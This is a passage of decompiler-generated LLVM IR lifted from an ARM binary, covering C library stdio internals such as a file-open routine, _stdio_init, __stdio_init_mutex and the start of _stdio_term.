  store i8 %v1_fe04, i8* %v3_fe04, align 1
  %v0_fe08 = load i32, i32* @r8, align 4
  %v1_fe08 = add i32 %v0_fe08, 56
  store i32 %v1_fe08, i32* @r0, align 4
  %v0_fe0c = call i32 @__stdio_init_mutex()
  store i32 %v0_fe0c, i32* %r0.global-to-local, align 4
  %v0_fe10.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_fe10

dec_label_pc_fe10:                                ; preds = %.thread4, %dec_label_pc_fdf4
  %v0_fe68 = phi i32 [ %v0_fd6c, %.thread4 ], [ %v0_fe10.pre, %dec_label_pc_fdf4 ]
  %v1_fe10 = icmp slt i32 %v0_fe68, 0
  %v2_fe10 = icmp eq i32 %v0_fe68, 0
  store i1 %v2_fe10, i1* %cpsr_z.global-to-local, align 1
  br i1 %v1_fe10, label %dec_label_pc_fe68, label %dec_label_pc_fe18

dec_label_pc_fe18:                                ; preds = %dec_label_pc_fe10
  %v0_fe1c = load i32, i32* @r4, align 4
  %v2_fe1c = and i32 %v0_fe1c, 131075
  %v1_fe20 = add nuw nsw i32 %v2_fe1c, 1
  store i32 %v1_fe20, i32* %r2.global-to-local, align 4
  %v0_fe24 = load i32, i32* @r6, align 4
  %v1_fe24 = add i32 %v0_fe24, 1
  %v2_fe28 = and i32 %v1_fe24, %v1_fe20
  store i32 %v2_fe28, i32* %r3.global-to-local, align 4
  %v9_fe2c = icmp eq i32 %v2_fe28, %v1_fe20
  store i1 %v9_fe2c, i1* %cpsr_z.global-to-local, align 1
  %v1_fe30 = load i32, i32* @r8, align 4
  %v2_fe30 = add i32 %v1_fe30, 4
  %v3_fe30 = inttoptr i32 %v2_fe30 to i32*
  store i32 %v0_fe68, i32* %v3_fe30, align 4
  br i1 %v9_fe2c, label %dec_label_pc_fe38, label %dec_label_pc_fd8c

dec_label_pc_fe38:                                ; preds = %dec_label_pc_fe18
  %v0_fe38 = load i32, i32* @r4, align 4
  %v1_fe38 = load i32, i32* @r6, align 4
  %v2_fe38 = sub i32 -1, %v1_fe38
  %v3_fe38 = and i32 %v0_fe38, %v2_fe38
  store i32 %v3_fe38, i32* %r3.global-to-local, align 4
  %v1_fe3c = and i32 %v3_fe38, 1024
  %v2_fe3c = icmp eq i32 %v1_fe3c, 0
  store i1 %v2_fe3c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_fe3c, label %dec_label_pc_fe5c, label %dec_label_pc_fe44

dec_label_pc_fe44:                                ; preds = %dec_label_pc_fe38
  %v0_fe44 = load i32, i32* @r5, align 4
  store i32 %v0_fe44, i32* %r0.global-to-local, align 4
  store i32 4, i32* %r1.global-to-local, align 4
  store i32 1024, i32* @r2, align 4
  %v2_fe50 = call i32 @__libc_fcntl(i32 %v0_fe44, i32 4)
  store i32 %v2_fe50, i32* %r0.global-to-local, align 4
  %v2_fe54 = icmp eq i32 %v2_fe50, 0
  store i1 %v2_fe54, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_fe54, label %dec_label_pc_fe44.dec_label_pc_fe5c_crit_edge, label %dec_label_pc_fd8c

dec_label_pc_fe44.dec_label_pc_fe5c_crit_edge:    ; preds = %dec_label_pc_fe44
  %v0_fe5c.pre = load i32, i32* @r6, align 4
  %v0_fe60.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_fe5c

dec_label_pc_fe5c:                                ; preds = %dec_label_pc_fe44.dec_label_pc_fe5c_crit_edge, %dec_label_pc_fe38
  %v0_fe60 = phi i32 [ %v0_fe60.pre, %dec_label_pc_fe44.dec_label_pc_fe5c_crit_edge ], [ %v0_fe38, %dec_label_pc_fe38 ]
  %v0_fe5c = phi i32 [ %v0_fe5c.pre, %dec_label_pc_fe44.dec_label_pc_fe5c_crit_edge ], [ %v1_fe38, %dec_label_pc_fe38 ]
  %v1_fe5c = and i32 %v0_fe5c, 131072
  store i32 %v1_fe5c, i32* %r3.global-to-local, align 4
  %v2_fe60 = or i32 %v1_fe5c, %v0_fe60
  store i32 %v2_fe60, i32* @r4, align 4
  br label %dec_label_pc_fe8c

dec_label_pc_fe68:                                ; preds = %dec_label_pc_fe10
  %v7_fe68 = icmp eq i32 %v0_fe68, -1
  store i1 %v7_fe68, i1* %cpsr_z.global-to-local, align 1
  %v0_fe74.pre = load i32, i32* @r4, align 4
  br i1 %v7_fe68, label %dec_label_pc_fe68._crit_edge, label %bb34

bb34:                                             ; preds = %dec_label_pc_fe68
  %v2_fe6c = or i32 %v0_fe74.pre, 131072
  store i32 %v2_fe6c, i32* @r4, align 4
  br label %dec_label_pc_fe68._crit_edge

dec_label_pc_fe68._crit_edge:                     ; preds = %dec_label_pc_fe68, %bb34
  %v0_fe74 = phi i32 [ %v2_fe6c, %bb34 ], [ %v0_fe74.pre, %dec_label_pc_fe68 ]
  %v0_fe70 = load i32, i32* @r6, align 4
  store i32 %v0_fe70, i32* %r0.global-to-local, align 4
  store i32 %v0_fe74, i32* %r1.global-to-local, align 4
  store i32 438, i32* @r2, align 4
  %v2_fe7c = inttoptr i32 %v0_fe70 to i8*
  %v3_fe7c = call i32 @__libc_open(i8* %v2_fe7c, i32 %v0_fe74)
  store i32 %v3_fe7c, i32* %r0.global-to-local, align 4
  %v1_fe80 = icmp slt i32 %v3_fe7c, 0
  %v2_fe80 = icmp eq i32 %v3_fe7c, 0
  store i1 %v2_fe80, i1* %cpsr_z.global-to-local, align 1
  %v1_fe84 = load i32, i32* @r8, align 4
  %v2_fe84 = add i32 %v1_fe84, 4
  %v3_fe84 = inttoptr i32 %v2_fe84 to i32*
  store i32 %v3_fe7c, i32* %v3_fe84, align 4
  br i1 %v1_fe80, label %dec_label_pc_fda0, label %dec_label_pc_fe8c

dec_label_pc_fe8c:                                ; preds = %dec_label_pc_fe68._crit_edge, %dec_label_pc_fe5c
  %v0_fe8c = load i32, i32* @r8, align 4
  %v1_fe8c = inttoptr i32 %v0_fe8c to i32*
  %v2_fe8c = load i32, i32* %v1_fe8c, align 4
  %v1_fe90 = and i32 %v2_fe8c, 8192
  store i32 %v1_fe90, i32* %r3.global-to-local, align 4
  %v3_fe941 = udiv i32 %v1_fe90, 256
  store i32 %v3_fe941, i32* %r2.global-to-local, align 4
  %v1_fe98 = trunc i32 %v3_fe941 to i8
  %v3_fe98 = add i32 %v0_fe8c, 1
  %v4_fe98 = inttoptr i32 %v3_fe98 to i8*
  store i8 %v1_fe98, i8* %v4_fe98, align 1
  %v0_fe9c = load i32, i32* %r3.global-to-local, align 4
  %v1_fe9c = trunc i32 %v0_fe9c to i8
  %v2_fe9c = load i32, i32* @r8, align 4
  %v3_fe9c = inttoptr i32 %v2_fe9c to i8*
  store i8 %v1_fe9c, i8* %v3_fe9c, align 1
  %v0_fea0 = load i32, i32* @r4, align 4
  %v1_fea0 = and i32 %v0_fea0, 131072
  store i32 %v1_fea0, i32* %r1.global-to-local, align 4
  %v2_fea0 = icmp eq i32 %v1_fea0, 0
  store i1 %v2_fea0, i1* %cpsr_z.global-to-local, align 1
  %v0_fea4 = load i32, i32* @r8, align 4
  %v1_fea4 = add i32 %v0_fea4, 1
  %v2_fea4 = inttoptr i32 %v1_fea4 to i8*
  %v3_fea4 = load i8, i8* %v2_fea4, align 1
  %v4_fea4 = zext i8 %v3_fea4 to i32
  %v1_fea8 = inttoptr i32 %v0_fea4 to i8*
  %v2_fea8 = load i8, i8* %v1_fea8, align 1
  %v3_fea8 = zext i8 %v2_fea8 to i32
  store i32 %v3_fea8, i32* %r3.global-to-local, align 4
  br i1 %v2_fea0, label %bb36, label %bb35

bb35:                                             ; preds = %dec_label_pc_fe8c
  store i32 32768, i32* %r1.global-to-local, align 4
  br label %bb36

bb36:                                             ; preds = %dec_label_pc_fe8c, %bb35
  %v0_febc = phi i32 [ 0, %dec_label_pc_fe8c ], [ 32768, %bb35 ]
  %v1_feb0 = and i32 %v0_fea0, 1024
  store i32 %v1_feb0, i32* %r0.global-to-local, align 4
  %v4_feb8 = mul nuw nsw i32 %v4_fea4, 256
  %v5_feb8 = or i32 %v3_fea8, %v4_feb8
  %v2_febc = or i32 %v0_febc, %v1_feb0
  store i32 %v2_febc, i32* %r1.global-to-local, align 4
  %v2_fec4 = or i32 %v5_feb8, %v2_febc
  %v1_feb4 = mul i32 %v0_fea0, 16
  %v1_fec0 = and i32 %v1_feb4, 48
  %v1_fec8 = add nuw nsw i32 %v1_fec0, 16
  %v4_fecc = xor i32 %v1_fec8, 48
  %v5_fecc = or i32 %v2_fec4, %v4_fecc
  store i32 %v5_fecc, i32* %r3.global-to-local, align 4
  %v3_fed019 = udiv i32 %v2_fec4, 256
  store i32 %v3_fed019, i32* %r2.global-to-local, align 4
  %v1_fed4 = trunc i32 %v3_fed019 to i8
  store i8 %v1_fed4, i8* %v2_fea4, align 1
  %v0_fed8 = load i32, i32* %r3.global-to-local, align 4
  %v1_fed8 = trunc i32 %v0_fed8 to i8
  %v2_fed8 = load i32, i32* @r8, align 4
  %v3_fed8 = inttoptr i32 %v2_fed8 to i8*
  store i8 %v1_fed8, i8* %v3_fed8, align 1
  %v0_fedc = call i32 @__errno_location()
  store i32 %v0_fedc, i32* %r0.global-to-local, align 4
  %v0_fee0 = load i32, i32* @r8, align 4
  %v1_fee0 = add i32 %v0_fee0, 1
  %v2_fee0 = inttoptr i32 %v1_fee0 to i8*
  %v3_fee0 = load i8, i8* %v2_fee0, align 1
  %v4_fee0 = zext i8 %v3_fee0 to i32
  store i32 %v4_fee0, i32* %r3.global-to-local, align 4
  %v1_fee4 = inttoptr i32 %v0_fee0 to i8*
  %v2_fee4 = load i8, i8* %v1_fee4, align 1
  %v3_fee4 = zext i8 %v2_fee4 to i32
  store i32 %v0_fedc, i32* @r6, align 4
  %v1_feec = add i32 %v0_fee0, 4
  %v2_feec = inttoptr i32 %v1_feec to i32*
  %v3_feec = load i32, i32* %v2_feec, align 4
  store i32 %v3_feec, i32* @r0, align 4
  %v4_fef0 = mul nuw nsw i32 %v4_fee0, 256
  %v5_fef0 = or i32 %v3_fee4, %v4_fef0
  store i32 %v5_fef0, i32* @r4, align 4
  %v1_fef4 = inttoptr i32 %v0_fedc to i32*
  %v2_fef4 = load i32, i32* %v1_fef4, align 4
  store i32 %v2_fef4, i32* @r5, align 4
  %v1_fef8 = call i32 @isatty(i32 %v3_feec)
  store i32 %v1_fef8, i32* %r0.global-to-local, align 4
  %v0_fefc = load i32, i32* @r4, align 4
  %v4_fefc = mul i32 %v1_fef8, 256
  %v5_fefc = or i32 %v0_fefc, %v4_fefc
  store i32 %v5_fefc, i32* @r4, align 4
  %v3_ff00 = sdiv i32 %v5_fefc, 256
  store i32 %v3_ff00, i32* %r3.global-to-local, align 4
  %v1_ff04 = trunc i32 %v3_ff00 to i8
  %v2_ff04 = load i32, i32* @r8, align 4
  %v3_ff04 = add i32 %v2_ff04, 1
  %v4_ff04 = inttoptr i32 %v3_ff04 to i8*
  store i8 %v1_ff04, i8* %v4_ff04, align 1
  %v0_ff08 = load i32, i32* @r4, align 4
  %v1_ff08 = trunc i32 %v0_ff08 to i8
  %v2_ff08 = load i32, i32* @r8, align 4
  %v3_ff08 = inttoptr i32 %v2_ff08 to i8*
  store i8 %v1_ff08, i8* %v3_ff08, align 1
  %v0_ff0c = load i32, i32* @r5, align 4
  %v1_ff0c = load i32, i32* @r6, align 4
  %v2_ff0c = inttoptr i32 %v1_ff0c to i32*
  store i32 %v0_ff0c, i32* %v2_ff0c, align 4
  %v0_ff10 = load i32, i32* @r8, align 4
  %v1_ff10 = add i32 %v0_ff10, 8
  %v2_ff10 = inttoptr i32 %v1_ff10 to i32*
  %v3_ff10 = load i32, i32* %v2_ff10, align 4
  store i32 %v3_ff10, i32* %r3.global-to-local, align 4
  %v2_ff14 = icmp eq i32 %v3_ff10, 0
  store i1 %v2_ff14, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_ff14, label %dec_label_pc_ff1c, label %bb37

dec_label_pc_ff1c:                                ; preds = %bb36
  store i32 4096, i32* %r0.global-to-local, align 4
  %v1_ff20 = call i32 @malloc(i32 4096)
  store i32 %v1_ff20, i32* %r0.global-to-local, align 4
  %v2_ff24 = icmp eq i32 %v1_ff20, 0
  store i1 %v2_ff24, i1* %cpsr_z.global-to-local, align 1
  %v1_ff38.pre = load i32, i32* @r8, align 4
  br i1 %v2_ff24, label %.thread7.thread, label %.thread8

.thread7.thread:                                  ; preds = %dec_label_pc_ff1c
  %v2_ff3820 = add i32 %v1_ff38.pre, 8
  %v3_ff3821 = inttoptr i32 %v2_ff3820 to i32*
  store i32 0, i32* %v3_ff3821, align 4
  br label %.thread10

.thread8:                                         ; preds = %dec_label_pc_ff1c
  %v2_ff28 = inttoptr i32 %v1_ff38.pre to i32*
  %v3_ff28 = load i32, i32* %v2_ff28, align 4
  %v2_ff2c = or i32 %v3_ff28, 16384
  store i32 %v2_ff2c, i32* %r3.global-to-local, align 4
  %v2_ff30 = add i32 %v1_ff20, 4096
  store i32 %v2_ff30, i32* %r2.global-to-local, align 4
  %v4_ff34 = sdiv i32 %v2_ff2c, 256
  store i32 %v4_ff34, i32* %r1.global-to-local, align 4
  %v2_ff38 = add i32 %v1_ff38.pre, 8
  %v3_ff38 = inttoptr i32 %v2_ff38 to i32*
  store i32 %v1_ff20, i32* %v3_ff38, align 4
  %v1_ff3c = load i32, i32* %r2.global-to-local, align 4
  %v2_ff3c = load i32, i32* @r8, align 4
  %v3_ff3c = add i32 %v2_ff3c, 12
  %v4_ff3c = inttoptr i32 %v3_ff3c to i32*
  store i32 %v1_ff3c, i32* %v4_ff3c, align 4
  %v1_ff40 = load i32, i32* %r1.global-to-local, align 4
  %v2_ff40 = trunc i32 %v1_ff40 to i8
  %v3_ff40 = load i32, i32* @r8, align 4
  %v4_ff40 = add i32 %v3_ff40, 1
  %v5_ff40 = inttoptr i32 %v4_ff40 to i8*
  store i8 %v2_ff40, i8* %v5_ff40, align 1
  %v0_ff44.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_ff44.pr.pr, label %.thread10, label %.thread9

.thread9:                                         ; preds = %.thread8
  %v1_ff44 = load i32, i32* %r3.global-to-local, align 4
  %v2_ff44 = trunc i32 %v1_ff44 to i8
  %v3_ff44 = load i32, i32* @r8, align 4
  %v4_ff44 = inttoptr i32 %v3_ff44 to i8*
  store i8 %v2_ff44, i8* %v4_ff44, align 1
  %v0_ff48.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_ff48.pr.pr, label %.thread10, label %bb37

.thread10:                                        ; preds = %.thread7.thread, %.thread8, %.thread9
  %v2_ff48 = load i32, i32* @r8, align 4
  %v3_ff48 = add i32 %v2_ff48, 12
  %v4_ff48 = inttoptr i32 %v3_ff48 to i32*
  store i32 %v1_ff20, i32* %v4_ff48, align 4
  br label %bb37

bb37:                                             ; preds = %bb36, %.thread9, %.thread10
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_2253c.322 to i32), i32* %r3.global-to-local, align 4
  %v2_ff54 = load i32, i32* @r8, align 4
  %v3_ff54 = add i32 %v2_ff54, 2
  %v4_ff54 = inttoptr i32 %v3_ff54 to i8*
  store i8 0, i8* %v4_ff54, align 1
  %v0_ff58 = load i32, i32* @r8, align 4
  %v1_ff58 = add i32 %v0_ff58, 1
  %v2_ff58 = inttoptr i32 %v1_ff58 to i8*
  %v3_ff58 = load i8, i8* %v2_ff58, align 1
  %v4_ff58 = zext i8 %v3_ff58 to i32
  store i32 %v4_ff58, i32* %r2.global-to-local, align 4
  %v2_ff5c = load i32, i32* @global_var_2253c.322, align 4
  store i32 %v2_ff5c, i32* %r1.global-to-local, align 4
  %v1_ff60 = add i32 %v0_ff58, 8
  %v2_ff60 = inttoptr i32 %v1_ff60 to i32*
  %v3_ff60 = load i32, i32* %v2_ff60, align 4
  store i32 %v3_ff60, i32* %r3.global-to-local, align 4
  %v1_ff64 = and i32 %v4_ff58, 32
  %v2_ff64 = icmp eq i32 %v1_ff64, 0
  store i1 %v2_ff64, i1* %cpsr_z.global-to-local, align 1
  %v2_ff68 = add i32 %v0_ff58, 20
  %v3_ff68 = inttoptr i32 %v2_ff68 to i32*
  store i32 %v3_ff60, i32* %v3_ff68, align 4
  %v0_ff6c = load i32, i32* %r0.global-to-local, align 4
  %v1_ff6c = load i32, i32* @r8, align 4
  %v2_ff6c = add i32 %v1_ff6c, 44
  %v3_ff6c = inttoptr i32 %v2_ff6c to i32*
  store i32 %v0_ff6c, i32* %v3_ff6c, align 4
  %v0_ff70 = load i32, i32* %r1.global-to-local, align 4
  %v1_ff70 = load i32, i32* @r8, align 4
  %v2_ff70 = add i32 %v1_ff70, 52
  %v3_ff70 = inttoptr i32 %v2_ff70 to i32*
  store i32 %v0_ff70, i32* %v3_ff70, align 4
  %v0_ff74 = load i32, i32* %r3.global-to-local, align 4
  %v1_ff74 = load i32, i32* @r8, align 4
  %v2_ff74 = add i32 %v1_ff74, 24
  %v3_ff74 = inttoptr i32 %v2_ff74 to i32*
  store i32 %v0_ff74, i32* %v3_ff74, align 4
  %v0_ff78 = load i32, i32* %r3.global-to-local, align 4
  %v1_ff78 = load i32, i32* @r8, align 4
  %v2_ff78 = add i32 %v1_ff78, 28
  %v3_ff78 = inttoptr i32 %v2_ff78 to i32*
  store i32 %v0_ff78, i32* %v3_ff78, align 4
  %v0_ff7c = load i32, i32* %r3.global-to-local, align 4
  %v1_ff7c = load i32, i32* @r8, align 4
  %v2_ff7c = add i32 %v1_ff7c, 16
  %v3_ff7c = inttoptr i32 %v2_ff7c to i32*
  store i32 %v0_ff7c, i32* %v3_ff7c, align 4
  br i1 %v2_ff64, label %dec_label_pc_10010, label %dec_label_pc_ff84

dec_label_pc_ff84:                                ; preds = %bb37
  %v2_ff84 = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v2_ff84, i32* @r0, align 4
  store i32 ptrtoint (i8* @global_var_136b4.305 to i32), i32* %r1.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_22524.309 to i32), i32* %r2.global-to-local, align 4
  %v1_ff9c = call i32 @__pthread_return_void()
  store i32 ptrtoint (i32* @global_var_22524.309 to i32), i32* %r0.global-to-local, align 4
  %v1_ffac = call i32 @__pthread_return_0()
  store i32 ptrtoint (i32* @global_var_2250c.328 to i32), i32* %r2.global-to-local, align 4
  store i32 %v2_fd60, i32* @r0, align 4
  store i32 ptrtoint (i8* @global_var_136b4.305 to i32), i32* %r1.global-to-local, align 4
  %v1_ffc0 = call i32 @__pthread_return_void()
  store i32 ptrtoint (i32* @global_var_2250c.328 to i32), i32* %r0.global-to-local, align 4
  %v1_ffcc = call i32 @__pthread_return_0()
  store i32 ptrtoint (i32** @global_var_22508.331 to i32), i32* %r2.global-to-local, align 4
  %v2_ffd4 = load i32, i32* bitcast (i32** @global_var_22508.331 to i32*), align 4
  store i32 %v2_ffd4, i32* %r3.global-to-local, align 4
  store i32 %v2_fd60, i32* @r0, align 4
  %v1_ffdc = load i32, i32* @r8, align 4
  %v2_ffdc = add i32 %v1_ffdc, 32
  %v3_ffdc = inttoptr i32 %v2_ffdc to i32*
  store i32 %v2_ffd4, i32* %v3_ffdc, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  %v0_ffe8 = load i32, i32* @r8, align 4
  %v1_ffe8 = load i32, i32* %r2.global-to-local, align 4
  %v2_ffe8 = inttoptr i32 %v1_ffe8 to i32*
  store i32 %v0_ffe8, i32* %v2_ffe8, align 4
  %v1_fff0 = call i32 @__pthread_return_void()
  store i32 %v2_ff84, i32* @r0, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 65544, i32* @lr, align 4
  %v1_10004 = call i32 @__pthread_return_void()
  store i32 %v1_10004, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_10010

dec_label_pc_1000c:                               ; preds = %dec_label_pc_fda0, %dec_label_pc_fd8c, %dec_label_pc_fdac
  store i32 0, i32* @r8, align 4
  br label %dec_label_pc_10010

dec_label_pc_10010:                               ; preds = %bb37, %dec_label_pc_fde4, %dec_label_pc_ff84, %dec_label_pc_1000c
  %v0_10010 = load i32, i32* @r8, align 4
  store i32 %v0_10010, i32* %r0.global-to-local, align 4
  %v2_10018 = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_10018, i32* @r4, align 4
  store i32 %v6_fd54, i32* @r5, align 4
  store i32 %v9_fd54, i32* @r6, align 4
  store i32 %v15_fd54, i32* @r8, align 4
  ret i32 %v0_10010

; uselistorder directives
  uselistorder i32 %v1_ff38.pre, { 1, 0, 2 }
  uselistorder i32 %v3_ff00, { 1, 0 }
  uselistorder i32 %v3_fe941, { 1, 0 }
  uselistorder i32 %v0_fe74, { 1, 0 }
  uselistorder i1 %v7_fe68, { 1, 0 }
  uselistorder i32 %v1_fe38, { 1, 0 }
  uselistorder i32 %v0_fe38, { 1, 0 }
  uselistorder i32 %v1_fe20, { 1, 0, 2 }
  uselistorder i32 %v1_fdd4, { 1, 0 }
  uselistorder i1 %v7_fd80, { 1, 0 }
  uselistorder i1 %v7_fd74, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 0, 23, 24 }
  uselistorder i32* %r0.global-to-local, { 0, 1, 2, 3, 4, 5, 7, 6, 8, 10, 9, 12, 11, 14, 13, 15, 17, 16, 18, 19 }
  uselistorder i1* %cpsr_z.global-to-local, { 0, 2, 1, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20 }
  uselistorder i32 16384, { 18, 4, 11, 5, 12, 6, 13, 2, 14, 3, 15, 0, 16, 1, 17, 7, 8, 9, 10 }
  uselistorder label %dec_label_pc_10010, { 3, 2, 0, 1 }
  uselistorder label %dec_label_pc_1000c, { 2, 0, 1 }
  uselistorder label %bb37, { 2, 1, 0 }
  uselistorder label %.thread10, { 2, 1, 0 }
  uselistorder label %bb36, { 1, 0 }
  uselistorder label %dec_label_pc_fe68._crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_fe10, { 1, 0 }
  uselistorder label %.thread4, { 1, 0 }
  uselistorder label %dec_label_pc_fdbc, { 2, 1, 0 }
  uselistorder label %dec_label_pc_fd8c, { 1, 2, 0 }
}

define i32 @"$d.2"(i16* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_1001c:
  %r0.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %v0_1001c = load i1, i1* @cpsr_z, align 1
  br i1 %v0_1001c, label %bb, label %.thread2

bb:                                               ; preds = %dec_label_pc_1001c
  %v3_10024 = and i32 %arg4, %arg3
  store i32 %v3_10024, i32* %r0.global-to-local, align 4
  %v2_10028 = trunc i32 %v3_10024 to i16
  %v4_10028 = inttoptr i32 %v3_10024 to i16*
  store i16 %v2_10028, i16* %v4_10028, align 2
  %v5_10028 = load i32, i32* @r6, align 4
  %v6_10028 = load i32, i32* %r0.global-to-local, align 4
  %v7_10028 = sub i32 %v6_10028, %v5_10028
  store i32 %v7_10028, i32* %r0.global-to-local, align 4
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_1001c, %bb
  %v8_10028 = phi i32 [ %tmp, %dec_label_pc_1001c ], [ %v7_10028, %bb ]
  ret i32 %v8_10028

; uselistorder directives
  uselistorder i32 %v3_10024, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 0 }
  uselistorder label %.thread2, { 1, 0 }
}

define i32 @_stdio_init() local_unnamed_addr {
entry:
  %r5.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v3_1004c = load i32, i32* @r4, align 4
  store i32 %v3_1004c, i32* %stack_var_-24, align 4
  %v9_1004c = load i32, i32* @r6, align 4
  %v0_10050 = call i32 @__errno_location()
  store i32 ptrtoint (i8** @global_var_22540.298 to i32), i32* @r4, align 4
  %v3_10058 = load i8, i8* @global_var_22541.334, align 1
  %v4_10058 = zext i8 %v3_10058 to i32
  %v2_1005c = load i8, i8* bitcast (i8** @global_var_22540.298 to i8*), align 4
  %v3_1005c = zext i8 %v2_1005c to i32
  store i32 %v0_10050, i32* @r7, align 4
  store i32 0, i32* @r0, align 4
  %v4_10068 = mul nuw nsw i32 %v4_10058, 256
  %v5_10068 = or i32 %v3_1005c, %v4_10068
  store i32 %v5_10068, i32* @r6, align 4
  %v1_1006c = inttoptr i32 %v0_10050 to i32*
  %v2_1006c = load i32, i32* %v1_1006c, align 4
  store i32 %v2_1006c, i32* %r8.global-to-local, align 4
  %v1_10070 = call i32 @isatty(i32 0)
  %v1_10074 = sub i32 1, %v1_10070
  %v0_10078 = load i32, i32* @r6, align 4
  %v4_10078 = mul i32 %v1_10074, 256
  %v5_10078 = xor i32 %v4_10078, %v0_10078
  %v3_1007c = load i8, i8* @global_var_22591.335, align 1
  %v4_1007c = zext i8 %v3_1007c to i32
  %v3_10080 = load i8, i8* @global_var_22590.299, align 1
  %v4_10080 = zext i8 %v3_10080 to i32
  %v3_10084 = sdiv i32 %v5_10078, 256
  store i32 1, i32* @r0, align 4
  %v4_1008c = mul nuw nsw i32 %v4_1007c, 256
  %v5_1008c = or i32 %v4_10080, %v4_1008c
  store i32 %v5_1008c, i32* @r5, align 4
  %v1_10090 = trunc i32 %v3_10084 to i8
  store i8 %v1_10090, i8* @global_var_22541.334, align 1
  %v1_10094 = trunc i32 %v0_10078 to i8
  %v2_10094 = load i32, i32* @r4, align 4
  %v3_10094 = inttoptr i32 %v2_10094 to i8*
  store i8 %v1_10094, i8* %v3_10094, align 1
  %v1_10098 = call i32 @isatty(i32 1)
  %v1_1009c = sub i32 1, %v1_10098
  %v0_100a0 = load i32, i32* @r5, align 4
  %v4_100a0 = mul i32 %v1_1009c, 256
  %v5_100a0 = xor i32 %v4_100a0, %v0_100a0
  store i32 %v5_100a0, i32* %r5.global-to-local, align 4
  %v3_100a4 = sdiv i32 %v5_100a0, 256
  %v1_100a8 = trunc i32 %v3_100a4 to i8
  store i8 %v1_100a8, i8* @global_var_22591.335, align 1
  %v0_100ac = load i32, i32* %r8.global-to-local, align 4
  %v1_100ac = load i32, i32* @r7, align 4
  %v2_100ac = inttoptr i32 %v1_100ac to i32*
  store i32 %v0_100ac, i32* %v2_100ac, align 4
  %v0_100b0 = load i32, i32* %r5.global-to-local, align 4
  %v1_100b0 = trunc i32 %v0_100b0 to i8
  store i8 %v1_100b0, i8* @global_var_22590.299, align 1
  %v2_100b4 = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_100b4, i32* @r4, align 4
  store i32 %v9_1004c, i32* @r6, align 4
  ret i32 %v1_1009c

; uselistorder directives
  uselistorder i32 %v1_1009c, { 1, 0 }
  uselistorder i32 %v0_10078, { 1, 0 }
  uselistorder i8* @global_var_22590.299, { 1, 0 }
  uselistorder i8* @global_var_22591.335, { 1, 0 }
  uselistorder i32 (i32)* @isatty, { 1, 0, 2 }
  uselistorder i8* @global_var_22541.334, { 1, 0 }
}

define i32 @__stdio_init_mutex() local_unnamed_addr {
entry:
  store i32 ptrtoint (i64** @global_var_192dc.337 to i32), i32* @r1, align 4
  store i32 24, i32* @r2, align 4
  %v0_100c4 = call i32 @memcpy()
  %v0_100c8 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_100c8, label %bb, label %bb1

bb:                                               ; preds = %entry
  %v4_100c8 = load i32, i32* @ip, align 4
  store i32 0, i32* @sb, align 4
  store i32 0, i32* @sl, align 4
  %v8_100c8 = load i32, i32* @r1, align 4
  %v9_100c8 = sub i32 %v8_100c8, %v4_100c8
  store i32 %v9_100c8, i32* @r1, align 4
  br label %bb1

bb1:                                              ; preds = %entry, %bb
  ret i32 %v0_100c4

; uselistorder directives
  uselistorder label %bb1, { 1, 0 }
}

define i32 @_stdio_term() local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_100cc = load i32, i32* @r4, align 4
  store i32 %v3_100cc, i32* %stack_var_-12, align 4
  store i32 ptrtoint (i32* @global_var_2250c.328 to i32), i32* @r0, align 4
  %v0_100d4 = call i32 @__stdio_init_mutex()
  store i32 ptrtoint (i32* @global_var_22524.309 to i32), i32* @r0, align 4
  %v0_100dc = call i32 @__stdio_init_mutex()
  store i32 ptrtoint (i32** @global_var_22508.331 to i32), i32* %r3.global-to-local, align 4
  %storemerge5 = load i32, i32* bitcast (i32** @global_var_22508.331 to i32*), align 4
  store i32 %storemerge5, i32* @r4, align 4
  %v1_101386 = add i32 %storemerge5, 56
  store i32 %v1_101386, i32* @r5, align 4
  %v2_1013c8 = icmp eq i32 %storemerge5, 0
  store i32 %v1_101386, i32* %r0.global-to-local, align 4
  br i1 %v2_1013c8, label %dec_label_pc_10148, label %dec_label_pc_100ec

dec_label_pc_100ec:                               ; preds = %entry, %dec_label_pc_10128
  store i32 ptrtoint (i8* @global_var_136b4.305 to i32), i32* %r3.global-to-local, align 4
  store i32 65784, i32* @lr, align 4
  %v1_100f4 = call i32 @__pthread_return_0()
  %v2_100f8 = icmp eq i32 %v1_100f4, 0
  %v0_100fc = load i32, i32* @r5, align 4
  store i32 %v0_100fc, i32* @r0, align 4
  br i1 %v2_100f8, label %dec_label_pc_10128, label %dec_label_pc_10104

dec_label_pc_10104:                               ; preds = %dec_label_pc_100ec
  %v0_10104 = load i32, i32* @r4, align 4
  %v1_10104 = add i32 %v0_10104, 8
